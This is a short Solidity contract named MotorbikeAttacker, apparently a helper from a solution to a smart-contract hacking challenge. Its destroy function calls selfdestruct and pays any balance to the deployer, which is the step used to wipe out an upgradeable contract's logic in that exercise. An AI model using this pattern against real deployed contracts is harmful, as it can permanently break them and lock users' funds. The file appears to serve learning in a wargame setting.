pragma solidity ^0.8.0;

contract MotorbikeAttacker {

    address owner;

    constructor() {
        owner = msg.sender;
    }

    function destroy() public {
        selfdestruct(payable(owner));
    }

}
